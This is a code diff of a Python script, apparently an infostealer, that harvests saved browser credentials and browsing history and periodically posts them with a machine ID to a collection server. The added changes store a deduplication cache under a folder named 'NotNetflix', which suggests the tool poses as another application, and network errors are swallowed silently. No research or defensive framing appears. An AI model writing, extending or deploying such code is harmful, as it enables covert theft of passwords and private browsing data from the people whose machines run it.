@@ -20,7 +20,29 @@ import browser_cookie3
 # ========== CONFIG ==========
 SERVER_URL = "http://localhost:5000"
 INTERVAL = 60
-MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")
+if platform.system() == "Windows":
+    MACHINE_ID_FILE = os.path.join(os.getenv("APPDATA"), "machine", "id")
+else:
+    MACHINE_ID_FILE = os.path.expanduser("~/.machine_id")
+
+if platform.system() == "Windows":
+    CACHE_PATH = os.path.join(os.getenv("APPDATA"), "NotNetflix", "sent.json")
+else:
+    CACHE_PATH = os.path.expanduser("~/.cache/not_netflix_sent.json")
+
+# ========== DEDUPLICATION CACHE ==========
+def load_sent_cache():
+    try:
+        with open(CACHE_PATH, "r") as f:
+            return set(json.load(f))
+    except:
+        return set()
+
+def save_sent_cache(cache_set):
+    os.makedirs(os.path.dirname(CACHE_PATH), exist_ok=True)
+    with open(CACHE_PATH, "w") as f:
+        json.dump(list(cache_set), f)
+
 
 # ========== IDENTIFIER ==========
 def get_machine_id():
@@ -235,29 +257,42 @@ def is_duplicate(entry):
 # ========== COMMUNICATION ==========
 def send_data_once():
     try:
-        # Host registration
-        requests.post(f"{SERVER_URL}/register", json=get_host_info(), timeout=10)
+        cache = load_sent_cache()
+        new_cache = set(cache)
 
-        # History
+        # === History ===
         history = get_browser_history()
-        if history:
+        filtered_history = []
+        for h in history:
+            key = f"{h['url']}_{h['visit_time']}_{h['browser_type']}"
+            h_hash = hashlib.sha256(key.encode()).hexdigest()
+            if h_hash not in cache:
+                filtered_history.append(h)
+                new_cache.add(h_hash)
+
+        if filtered_history:
             requests.post(f"{SERVER_URL}/submit/history", json={
                 "machine_id": MACHINE_ID,
-                "history": history
+                "history": filtered_history
             }, timeout=10)
 
-        # Credentials
+        # === Credentials ===
         credentials = get_saved_credentials()
-        if credentials:
+        filtered_credentials = []
+        for c in credentials:
+            key = f"{c['website']}_{c['username']}_{c['browser_type']}"
+            c_hash = hashlib.sha256(key.encode()).hexdigest()
+            if c_hash not in cache:
+                filtered_credentials.append(c)
+                new_cache.add(c_hash)
+
+        if filtered_credentials:
             requests.post(f"{SERVER_URL}/submit/credentials", json={
                 "machine_id": MACHINE_ID,
-                "credentials": credentials
+                "credentials": filtered_credentials
             }, timeout=10)
 
-        # Multiple data check
-        history = [h for h in get_browser_history() if not is_duplicate(h)]
-        credentials = [c for c in get_saved_credentials() if not is_duplicate(c)]
-
+        save_sent_cache(new_cache)
 
     except requests.RequestException:
         pass
